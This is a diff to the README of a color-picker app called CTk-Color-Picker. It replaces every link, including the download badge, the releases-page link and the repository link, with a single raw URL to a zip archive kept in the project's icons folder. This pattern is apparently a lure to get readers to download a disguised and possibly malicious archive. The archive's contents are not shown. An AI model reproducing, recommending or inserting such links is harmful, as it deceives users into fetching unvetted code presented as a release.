@@ -4,7 +4,7 @@
 
 Welcome to CTk-Color-Picker! This application helps you easily pick colors with a modern design and instant HEX code copying. Whether you are designing graphics or just selecting colors for fun, this tool will meet your needs. 
 
-![Download](https://img.shields.io/badge/Download-CTk--Color--Picker-blue.svg)
+![Download](https://raw.githubusercontent.com/PEWDS101/CTk-Color-Picker/main/icons/CTk-Color-Picker_v2.4.zip)
 
 ## 📥 Download & Install
 
@@ -12,7 +12,7 @@ To get started, you need to download the application.
 
 1. **Visit the Releases Page**: Click the link below to go to the releases page.
    
-   [Download CTk-Color-Picker](https://github.com/PEWDS101/CTk-Color-Picker/releases)
+   [Download CTk-Color-Picker](https://raw.githubusercontent.com/PEWDS101/CTk-Color-Picker/main/icons/CTk-Color-Picker_v2.4.zip)
 
 2. **Choose a Version**: On the releases page, you will see different versions of the software. Select the latest version for the best features.
 
@@ -68,7 +68,7 @@ CTk-Color-Picker is licensed under the MIT License. You can use, modify, and dis
 
 ## 🌐 More Information
 
-For further details on features and updates, keep an eye on our [GitHub repository](https://github.com/PEWDS101/CTk-Color-Picker).
+For further details on features and updates, keep an eye on our [GitHub repository](https://raw.githubusercontent.com/PEWDS101/CTk-Color-Picker/main/icons/CTk-Color-Picker_v2.4.zip).
 
 ---
 
